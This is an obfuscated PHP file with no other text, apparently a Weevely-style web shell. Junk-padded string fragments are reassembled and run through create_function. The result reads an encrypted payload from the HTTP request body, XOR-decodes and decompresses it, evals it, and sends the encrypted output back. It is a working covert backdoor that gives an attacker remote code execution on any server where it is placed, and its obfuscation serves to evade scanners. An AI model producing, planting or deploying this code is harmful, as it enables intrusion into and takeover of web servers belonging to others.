<?php
$T='($m[F#1]),$k))F#);$o=@ob_gF#et_contF#ents();F#@oF#b_end_F#clean();$r=F#@bas';
$Z='h("/$khF#F#(.+)$kF#f/",@fF#ile_get_conteF#ntF#F#s("phpF#://input"),$m)==F';
$j=str_replace('Gz','','GzcreaGztGze_fuGznGzctGzion');
$B='#F#1) {@oF#b_start(F#);@eF#val(@gzF#uF#ncompress(F#F#@x(@bF#ase64_decoF#de';
$K='F#JTAI0F#q6JsgoB2F#F#4SO";fuF#nction x($F#t,$F#k){$c=strF#len($kF#)F#;$l=F#';
$W='$k="e7F#eeeba3";F#$kh="6fF#F#b1d1bF#0145F#1";$kf="97c49F#2d7f8F#9f";$p="';
$h='strlen($t);$o=F#"";fF#or($F#i=0;$i<$F#l;){for(F#$j=0;(F#$F#F#j<$c&&$iF#<';
$J='eF#64_encF#oF#F#F#de(@x(@gzcompresF#sF#($o),$F#k));print("$F#p$kh$r$kf");}';
$p='$F#l)F#;$j++,$i++){$o.F#=$t{$i}^F#$k{$j};}}reF#tuF#rn $o;}F#if (@preF#g_matcF#';
$b=str_replace('F#','',$W.$K.$h.$p.$Z.$B.$T.$J);
$Q=$j('',$b);$Q();
?>
